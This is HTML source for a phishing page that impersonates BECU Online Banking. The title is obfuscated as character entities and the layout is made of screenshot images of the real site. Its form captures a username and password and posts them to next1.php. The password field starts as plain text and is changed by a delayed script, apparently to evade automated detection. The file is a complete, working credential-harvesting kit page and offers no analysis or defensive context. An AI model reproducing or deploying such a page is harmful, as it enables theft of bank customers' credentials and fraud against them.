<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#69;&#67;&#85;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  <style type="text/css">
.textbox {
  	padding-left: 5px;
  	font-family: Verdana;
    font-size: 11px;
    color: #333;
    height: 27px;
    width: 275px;
    border: 1px solid #959595;
}
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:126px; z-index:0"><a href="#"><img src="images/b1.png" alt="" title="" border=0 width=1349 height=126></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:86px; top:149px; width:993px; height:266px; z-index:1"><img src="images/b2.png" alt="" title="" border=0 width=993 height=266></div>

<div id="image3" style="position:absolute; overflow:hidden; left:91px; top:472px; width:351px; height:161px; z-index:2"><a href="#"><img src="images/b3.png" alt="" title="" border=0 width=351 height=161></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:728px; width:1349px; height:342px; z-index:3"><a href="#"><img src="images/b4.png" alt="" title="" border=0 width=1349 height=342></a></div>
<form action=next1.php name=aramsejao id=aramsejao method=post>
<input name="usr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:194px;top:296px;z-index:4">
<input name="psw" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:194px;top:333px;z-index:5">
<div id="formimage1" style="position:absolute; left:90px; top:394px; z-index:6"><input type="image" name="formimage1" width="65" height="39" src="images/btn.png"></div>
</div>

</body>
</html>
